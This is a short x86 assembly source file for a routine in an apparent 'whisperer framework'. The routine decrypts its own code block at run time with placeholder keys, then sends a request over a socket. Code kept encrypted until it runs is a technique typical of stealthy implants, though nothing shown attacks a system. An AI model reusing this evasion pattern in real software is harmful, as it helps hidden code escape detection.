use32
org 0



SendBlockCall:
        push ebp
        mov ebp, esp

        mov ebx, 0xaaaaaaaa ;key0
        mov edx, 0xbbbbbbbb ;key1
        mov ecx, .call_end - .call_begin

        mov eax, [ebp + 8] ; eax = whisperer context
        mov eax, [eax] ; eax = whisperer framework
        mov eax, [eax + 16] ; eax = decryption function

        call eax

.call_begin:
dq 0x2222222222222222 ; delimiter, gets filled with nops at run time

        mov ebx, [ebp + 8] ; ebx = context

        mov eax, [ebx] ; eax = framework
        mov eax, dword [eax + 44] ; eax = send


        push 0 ; flags
        push dword [ebx + 840] ; length of request
        push dword [ebx + 4]   ; request
        push dword [ebx + 32]  ; socket handle

        call eax ; call send

        mov ebx, [ebp + 8]  ; ebx = context
        mov dword [ebx + 848], eax ; store error code

db 7 dup (0x90)

        pop ebp
        ret 4

.call_end: